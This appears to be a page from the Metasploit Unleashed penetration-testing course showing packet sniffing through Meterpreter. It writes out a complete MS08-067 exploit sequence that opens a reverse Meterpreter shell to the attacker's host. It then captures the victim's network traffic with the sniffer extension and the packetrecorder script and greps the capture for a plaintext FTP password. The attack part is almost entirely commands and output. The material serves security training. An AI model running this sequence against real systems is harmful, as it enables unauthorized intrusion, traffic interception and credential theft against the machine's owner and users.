<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Packet Sniffing With Meterpreter</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Packet
Sniffing With Meterpreter</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">During the time of writing the
tutorials for this course, H.D. Moore
released a new feature for the Metasploit Framework that is very
powerful in every regard. Meterpreter now has the capability of packet
sniffing the remote host without ever touching the hard disk. This is
especially useful if we want to monitor what type of information is
being sent, and even better, this is probably the start of multiple
auxiliary modules that will ultimately look for sensitive data within
the capture files. The sniffer module can store up to 200,000 packets
in a ring buffer and exports them in standard PCAP format so you can
process them using psnuffle, dsniff, wireshark, etc.
</p>
<p style="color: rgb(0, 0, 0);">We first fire off our remote exploit
toward the victim and gain our standard reverse Meterpreter console.
<br>
<br>
</p>
<pre id="code">msf &gt; use windows/smb/ms08_067_netapi<br>msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpeter/reverse_tcp<br>msf exploit(ms08_067_netapi) &gt; set LHOST 10.211.55.126<br>msf exploit(ms08_067_netapi) &gt; set RHOST 10.10.1.119<br>msf exploit(ms08_067_netapi) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Triggering the vulnerability...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (205824 bytes)<br>[*] Meterpreter session 1 opened (10.10.1.4:4444 -&gt; 10.10.1.119:1921)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">From here we initiate the sniffer on
interface 1 and start collecting packets. We then dump the sniffer
output to /tmp/all.cap.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; use sniffer<br>Loading extension sniffer...success.<br><br><u>meterpreter</u> &gt; help<br><br>Sniffer Commands<br>================<br><br>     Command             Description<br>     -------             -----------<br>     sniffer_dump        Retrieve captured packet data<br>     sniffer_interfaces  List all remote sniffable interfaces<br>     sniffer_start       Capture packets on a previously opened interface<br>     sniffer_stats       View statistics of an active capture<br>     sniffer_stop        Stop packet captures on the specified interface<br><br><u>meterpreter</u> &gt; sniffer_interfaces<br><br>1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )<br><br><u>meterpreter</u> &gt; sniffer_start 1<br>[*] Capture started on interface 1 (200000 packet buffer)<br><br><u>meterpreter</u> &gt; sniffer_dump 1 /tmp/all.cap<br>[*] Dumping packets from interface 1...<br>[*] Wrote 19 packets to PCAP file /tmp/all.cap<br><br><u>meterpreter</u> &gt; sniffer_dump 1 /tmp/all.cap<br>[*] Dumping packets from interface 1...<br>[*] Wrote 199 packets to PCAP file /tmp/all.cap</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We can now use our favorite parser
or packet analysis tool to review the information intercepted.
</span>
<p style="color: rgb(0, 0, 0);">The Meterpreter packet sniffer uses the
MicroOLAP Packet Sniffer SDK
and can sniff the packets from the victim machine without ever having
to install any drivers or write to the file system. The module is smart
enough to realize its own traffic as well and will automatically remove
any traffic from the Meterpreter interaction. In addition, Meterpreter
pipes all information through an SSL/TLS tunnel and is fully encrypted.
<br>
</p>
<h3 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="packetrecorder">packetrecorder</span></h3>
<p style="color: rgb(0, 0, 0);">As an alternative to using the sniffer
extension, Carlos Perez wrote
the packetrecorder Meterpreter script that allows for some more
granularity when capturing packets. To see what options are available,
we issue the <b>"run packetrecorder"</b> comamnd without any
arguments.
<br>
<br>
</p>
<pre id="code"><u>meterpreter</u> &gt; run packetrecorder <br>Meterpreter Script for capturing packets in to a PCAP file<br>on a target host given a interface ID.<br><br>OPTIONS:<br><br>    -h        Help menu.<br>    -i   Interface ID number where all packet capture will be done.<br>    -l   Specify and alternate folder to save PCAP file.<br>    -li        List interfaces that can be used for capture.<br>    -t   Time interval in seconds between recollection of packet, default 30 seconds.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Before we start sniffing traffic, we
first need to determine which interfaces are available to us.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; run packetrecorder -li<br><br>1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )<br>2 - 'Citrix XenServer PV Ethernet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )<br>3 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will begin sniffing traffic on
the second interface, saving the logs
to the desktop of our BackTrack system and let the sniffer run for
awhile.
</span>
<pre id="code"><u>meterpreter</u> &gt; run packetrecorder -i 2 -l /root/<br>[*] Starting Packet capture on interface 2<br>[+] Packet capture started<br>[*] Packets being saved in to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap<br>[*] Packet capture interval is 30 Seconds<br>^C<br>[*] Interrupt <br>[+] Stopping Packet sniffer...<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">There is now a capture file waiting
for us that can be analyzed in
a tool such as Wireshark or tshark. We will take a quick look to see if
we captured anything interesting.
</span>
<pre id="code">root@bt4:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS<br>Running as user "root" and group "root". This could be dangerous.<br>2489  82.000000 192.168.1.201 -&gt; 209.132.183.61 FTP Request: PASS s3cr3t<br>2685  96.000000 192.168.1.201 -&gt; 209.132.183.61 FTP Request: PASS s3cr3t</pre>
<span style="color: rgb(0, 0, 0);">Success! The packetrecorder captured
a FTP password for us.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
